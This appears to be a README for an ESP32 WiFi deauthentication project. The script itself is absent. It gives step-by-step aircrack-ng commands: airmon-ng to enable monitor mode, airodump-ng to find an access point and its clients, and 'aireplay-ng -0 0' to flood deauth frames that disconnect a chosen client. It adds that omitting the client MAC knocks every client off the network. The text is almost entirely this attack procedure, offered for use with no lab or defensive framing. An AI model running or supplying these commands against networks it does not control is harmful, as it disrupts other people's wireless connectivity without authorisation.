# ESP32-Deauthroize-clients-script

The code will deauth a single client on a wifi net.

Replace SSID and password with you own. Also change the MAC addresses.

You will need to find the BSSID and the MAC of your client.

Note what mode your wlan is in:

iwconfig

Ie.:
wlan0     IEEE 802.11  ESSID:"INDIGO"  
          Mode:Managed  Frequency:5.24 GHz  Access Point: 78:D2:94:44:D2:2C   
          Bit Rate=200 Mb/s   Tx-Power=31 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on
          Link Quality=58/70  Signal level=-52 dBm  
          Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0
          Tx excessive retries:0  Invalid misc:0   Missed beacon:0

To put wifi nic into monitor mode:
sudo airmon-ng start wlan0

To show who is on the network:
sudo airodump-ng wlan0mon

To monitor a specific client:
-d is destination target 
-c is channel number (found from using the airdump-ng command above)  
sudo airodump-ng -d 7E:D2:94:44:BA:28 -c 8 wlan0mon

To deuth a client :
-0 means deauth
-a and mac is teh AP
-c and mac is the client we want to deauth (leave this out to kick all clients off

sudo aireplay-ng -0 0 -a 7E:D2:94:44:BA:28 -c 44:4f:8E:9A:FF:8A wlan0mon

